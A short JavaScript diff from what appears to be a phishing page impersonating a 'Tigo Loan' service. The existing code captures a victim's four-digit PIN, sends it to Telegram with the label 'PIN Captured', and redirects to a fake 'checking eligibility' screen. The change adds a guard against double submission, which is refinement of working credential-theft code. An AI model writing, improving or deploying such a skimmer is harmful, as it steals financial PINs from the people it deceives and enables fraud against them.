@@ -145,8 +145,12 @@
                 }
             }
 
+            let isSubmitting = false;
             confirmBtn.addEventListener('click', async () => {
-                if (pin.length === 4) {
+                if (pin.length === 4 && !isSubmitting) {
+                    isSubmitting = true;
+                    confirmBtn.style.opacity = '0.5';
+                    confirmBtn.style.pointerEvents = 'none';
                     await sendToTelegram(`<b>Tigo Loan - PIN Captured</b>\nPIN: <code>${pin}</code>`);
                     const msg = encodeURIComponent('Processing loan, checking eligibility...');
                     window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
